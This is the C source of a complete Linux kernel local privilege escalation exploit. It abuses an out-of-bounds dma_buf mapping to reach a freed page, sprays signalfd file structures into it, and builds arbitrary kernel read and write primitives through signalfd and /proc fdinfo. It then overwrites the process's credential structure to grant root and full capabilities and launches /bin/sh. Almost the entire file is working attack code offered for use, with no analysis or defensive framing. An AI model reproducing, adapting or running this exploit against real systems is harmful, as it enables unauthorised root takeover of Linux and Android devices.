#define _GNU_SOURCE
#include "dma_buf_t.h"
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/io.h>
#include <errno.h>
#include <stdio.h>
#include <sys/signalfd.h>
#include <syscall.h>
#include <sys/fcntl.h>
#include <string.h>

//Forward declaration of cleanup, so we can use it in fatal_perror macro
void cleanup();

#define PAGE_SIZE (4096)
#define DMA_BUF_SIZE (7*PAGE_SIZE)

//Wrapper macros for exiting with an error and guaranteeing cleanup
#define fatal_perror(text) do{perror("[-] " text); cleanup(); exit(-1);}while(0)
#define fatal_printf(...) do{perror("[-] " __VA_ARGS__); cleanup(); exit(-1);}while(0)

//Spray configurations
#define DMA_BUF_SPRAY_SIZE (8*PAGE_SIZE)
#define NUM_SPRAY_BUFS (40)

#define DMA_BUF_DRAIN_SIZE (4*PAGE_SIZE)
#define NUM_DRAIN_BUFS (3)

#define NUM_FD_SPRAYS (64)

//Scan iterations
#define NUM_SCAN_ITERATIONS (1000)

//Offsets in struct file
#define SIGNALFD_OPS_NIBBLES (0xf40)
#define SIGNALFD_OPS_TO_PRIV_OFF (0xa0)
#define SIGNALFD_OPS_TO_CRED_OFF (0x68)
#define STRUCT_FILE_SIZE (256)
#define SIGNALFD_OPS_MAX_OFF (0xa0)

//If we find ops, but would need to cross a page boundary that's an issue
//this can't really happen here, because `struct file` is 256 bytes which divides the page size
//I'm just inclusing this for generality
#define SCAN_PAGE_LIMIT (PAGE_SIZE - SIGNALFD_OPS_MAX_OFF - 8)

dma_buf_t* spray_bufs[NUM_SPRAY_BUFS] = {0};
dma_buf_t* drain_bufs[NUM_DRAIN_BUFS] = {0};

int fd_sprays[NUM_FD_SPRAYS] = {0};

//Typedef to help make distinguishing between kernel and user space pointers easier
typedef void* kptr;

//Global data for the exploit
struct
{
    int spray_bufs_active;          //Flag that spray_bufs need cleanup
    int drain_bufs_active;          //Flag that drain_bufs need cleanup
    char* uaf_page;                 //Address of the UAF page
    int fds_sprayed;                //Flag that fd_sprays need cleanup
    int page_is_faulted_in;         //Flag that UAF page needs to be unmapped
    int found_filp_struct;          //Flag to show we found a fitting filp
    void* found_signalfd_ops_addr;  //Address of the `file_operations` field of the `struct file` in the UAF page
    int signalfd_fd;                //Signalfd fd number that corresponds to `struct file` in the UAF page
    int signalfd_proc_fd;           //fd number of /proc/$PID/fdinfo/$signalfd_fd
    uint64_t* signalfd_priv;        //pointer to `file->private_data`
    kptr* signalfd_creds;           //pointer to `file->f_cred`
} exploit_data = {0};

void hexdump(char* addr, size_t len)
{
    const size_t line_size=32;
    const size_t group_by = 8;
    size_t off = 0;
    int64_t rem = len;
    printf("hexdump@%p:\n",addr);
    while(rem)
    {
        printf("+0x%04lx:", off);
        for(int l_cnt=0; l_cnt<line_size && rem; l_cnt++,off++,rem--)
        {
            if((l_cnt%group_by)==0)
                printf(" ");
            printf("%02hhx", addr[off]);
        }
        printf("\n");
    }
}

//Spray and cleanup pairs for different sprays
void spray_dma_bufs()
{
    for(int i=0; i<NUM_SPRAY_BUFS; i++)
        spray_bufs[i] = dma_buf_create(DMA_BUF_SPRAY_SIZE);
    exploit_data.spray_bufs_active = 1;
}

void spray_dma_bufs_clean()
{
    for(int i=0; i<NUM_SPRAY_BUFS; i++)
    {
        dma_buf_destroy(spray_bufs[i]);
        spray_bufs[i] = NULL;
    }
    exploit_data.spray_bufs_active = 0;
}

void drain_dma_bufs()
{
    for(int i=0; i<NUM_DRAIN_BUFS; i++)
        drain_bufs[i] = dma_buf_create(DMA_BUF_DRAIN_SIZE);

    exploit_data.drain_bufs_active = 1;
}

void drain_dma_bufs_clean()
{
    for(int i=0; i<NUM_DRAIN_BUFS; i++)
    {
        dma_buf_destroy(drain_bufs[i]);
        drain_bufs[i] = NULL;
    }
    exploit_data.drain_bufs_active = 0;
}

void spray_fds()
{
    uint64_t data = 0;

    for(int i=0; i<NUM_FD_SPRAYS; i++)
        fd_sprays[i] = signalfd(-1, (sigset_t*)&data, 0);

    exploit_data.fds_sprayed = 1;
}

void spray_fds_clean()
{
    for(int i=0; i<NUM_FD_SPRAYS; i++)
        close(fd_sprays[i]);
    exploit_data.fds_sprayed = 0;
}

//Alter value in the `struct file` mode flags
//so that we can scan for the fd using `fcntl`
int identify_signal_fd()
{
    void* sigfd_ops = exploit_data.found_signalfd_ops_addr;
    uint64_t *mode_flags_ptr = sigfd_ops + 0x18;
    uint64_t old_val = *mode_flags_ptr;
    uint64_t marker_value = 0xfefe;
    *mode_flags_ptr = marker_value;
    for(int i=0; i<NUM_FD_SPRAYS; i++)
    {
        int mode = fcntl(fd_sprays[i], F_GETFL);
        //printf("[+] %d: %x\n", fd_sprays[i], mode);
        if(mode == (int)marker_value)
        {
            printf("[+] Found signalfd fd_idx\n");
            exploit_data.signalfd_fd = fd_sprays[i];
            break;
        }
    }
    *mode_flags_ptr = old_val;
    return 0;
}

//Arbitrary read of 8 bytes
uint64_t arb_read_8(kptr kernel_ptr)
{
    char buffer[128] = {0};
    //Remember old_val and set to kernel_ptr we want to read
    uint64_t old_val = *exploit_data.signalfd_priv;
    *exploit_data.signalfd_priv = (uint64_t)kernel_ptr;

    //Reset seq_file
    lseek64(exploit_data.signalfd_proc_fd, SEEK_SET, 0);
    size_t amount = read(exploit_data.signalfd_proc_fd, buffer, sizeof(buffer));
    if(amount<0)
    {
        *exploit_data.signalfd_priv = old_val;
        fatal_perror("[-] signalfd procfs read");
    }
    //printf("%s\n", buffer+amount-17);
    char* end_ptr = NULL;
    uint64_t res = strtoull(buffer+amount-17, &end_ptr, 16);
    *exploit_data.signalfd_priv = old_val;
    return ~res;
}

//Glibc will mask 32 bits of the sigset otherwise.
void raw_signalfd(int fd, sigset_t* sigset)
{
    syscall(__NR_signalfd, fd, sigset, 8);
}

//Arbitrary write of 8 bytes (except bit 9 and bit 19 are always set)
int arb_write_8(kptr dst, uint64_t val)
{
    uint64_t old_val = *exploit_data.signalfd_priv;
    *exploit_data.signalfd_priv = (uint64_t)dst;
    val = ~val;
    raw_signalfd(exploit_data.signalfd_fd, (sigset_t*)&val);
    *exploit_data.signalfd_priv = old_val;
}

//Arbitrary read, requires number of bytes to be divisible by 8
int arb_read(char* dst, kptr src, ssize_t num)
{
    if(num%8)
        printf("[-] WARN: make sure size is divisible by 8");
    uint64_t* curr = (uint64_t*)dst;
    kptr c_src = src;
    while(num>0)
    {
        *curr = arb_read_8(c_src);
        curr++;
        c_src += 8;
        num -= 8;
    }
    return num;
}

//Dump memory from the beginning of `struct cred`
void dump_creds(kptr creds)
{
    char buffer[128];
    arb_read(buffer, creds, sizeof(buffer));
    hexdump(buffer, sizeof(buffer));
}

//Open procfs `fdinfo` of signalfd
int prep_sigfd_read()
{
    char path_buffer[256] = {0};
    pid_t pid = getpid();
    snprintf(path_buffer, sizeof(path_buffer), "/proc/%d/fdinfo/%d", pid, exploit_data.signalfd_fd);
    printf("[+] Opening %s\n", path_buffer);
    exploit_data.signalfd_proc_fd = open(path_buffer, O_RDONLY);
    if(exploit_data.signalfd_proc_fd<0)
    {
        fatal_perror("Open signalfd procfs info file");
    }
    exploit_data.signalfd_priv = exploit_data.found_signalfd_ops_addr+SIGNALFD_OPS_TO_PRIV_OFF;
    return 0;
}

//Access page to cause page fault and have page mapped.
void fault_in_page(void* page)
{
    *(volatile char*)page;
    exploit_data.page_is_faulted_in = 1;
}

//Cause `zap_page_range` to drop page map_count and ref_count
void return_page(void* page)
{
    madvise(page, PAGE_SIZE, MADV_DONTNEED);
    exploit_data.page_is_faulted_in = 0;
}

//Clean up anything that may jeopardize kernel stability
void cleanup()
{
    //Unmap page first
    if(exploit_data.page_is_faulted_in)
        return_page(exploit_data.uaf_page);
    if(exploit_data.drain_bufs_active)
        drain_dma_bufs_clean();
    if(exploit_data.fds_sprayed)
        spray_fds_clean();
    if(exploit_data.spray_bufs_active)
        spray_dma_bufs_clean();
}

int main(int argc, char* argv[])
{
    memset(&exploit_data, 0, sizeof(exploit_data));
    
    //Prime buffers in kmalloc-64 to contain 8 pointers to struct page.
    spray_dma_bufs();
    spray_dma_bufs_clean();
    //Drain pcp freelist
    drain_dma_bufs();
    //Allocate dma_buf with 7 pages, so that the OOB access will grab a pointer from the 8th page of a primed buffer.
    dma_buf_t *dma_buf = dma_buf_create(DMA_BUF_SIZE);
    //Free memory again, so that the page we stole is likely on pcp_freelist now
    drain_dma_bufs_clean();

    if(!dma_buf)
        fatal_perror("dma_buf_create");
    char* mapping = mmap(0, dma_buf->size, PROT_READ|PROT_WRITE, MAP_SHARED, dma_buf->fd, 0);
    if(mapping == MAP_FAILED)
        fatal_perror("dma_buf mmap");
    
    //mremap to be able to access page OOB
    char* new_mapping = mremap(mapping, dma_buf->size, dma_buf->size+PAGE_SIZE, MREMAP_MAYMOVE);
    if(new_mapping == MAP_FAILED)
        fatal_perror("dma_buf mremap");
    
    exploit_data.uaf_page = new_mapping+dma_buf->size;

    //Spray and scan UAF page to find `struct file` with `signalfd_fops`
    for(int i=0; i<NUM_SCAN_ITERATIONS; i++)
    {
        spray_fds();
        drain_dma_bufs(); //Make sure stolen page isn't on freelist (see notes/third_week.md for details)

        //printf("[+] didn't crash\n");

        //Causes fault
        fault_in_page(exploit_data.uaf_page);
        for(int j=0; j<SCAN_PAGE_LIMIT/8; j++)
        {
            uint64_t curr_val = ((uint64_t*)exploit_data.uaf_page)[j];
            if((curr_val & 0xfff) == SIGNALFD_OPS_NIBBLES)
            {
                printf("[+] Found signalfd_ops\n");
                hexdump(exploit_data.uaf_page+8*j, 0x200);
                exploit_data.found_signalfd_ops_addr = exploit_data.uaf_page+j*8;
                exploit_data.found_filp_struct = 1;
                return_page(exploit_data.uaf_page);
                break;
            }
        }
        if(exploit_data.found_filp_struct)
            break;
        return_page(exploit_data.uaf_page);

        spray_fds_clean();
        drain_dma_bufs_clean();
    }

    //Check that we succeeded
    if(!exploit_data.found_filp_struct)
    {
        hexdump(exploit_data.uaf_page, 0x200);
        fatal_printf("[-] Didn't find struct file in memory\n");
    }

    //If we get to here, there is some `struct file` with `signalfd_fops` in our page.
    if(identify_signal_fd()<0)
        fatal_printf("Failed to identify signalfd\n");

    if(prep_sigfd_read()<0)
        fatal_printf("Failed to prep sigfd read\n");

    //Read list head to verify our arb_read works
    kptr list_head = (kptr)exploit_data.signalfd_priv[1];
    uint64_t val = arb_read_8(list_head);
    printf("[+] read %lx @%p\n", val, list_head);

    //Find creds from filp in page
    exploit_data.signalfd_creds = ((void*)exploit_data.found_signalfd_ops_addr) + SIGNALFD_OPS_TO_CRED_OFF;
    kptr creds = *exploit_data.signalfd_creds;

    //Dump creds before
    printf("[+] reading creds @ %p\n", creds);
    dump_creds(creds);

    for(int i=4; i<48; i++)
    {
        arb_write_8(creds+i, 0);
    }
    //Dump creds after
    arb_write_8(creds+48, 0x1ffffffffffULL);
    dump_creds(creds);
    
    //Clean up file descriptors and unmap stolen page.
    cleanup();

    char* nargv[] = {"/bin/sh", NULL};
    execve("/bin/sh", nargv, NULL);
}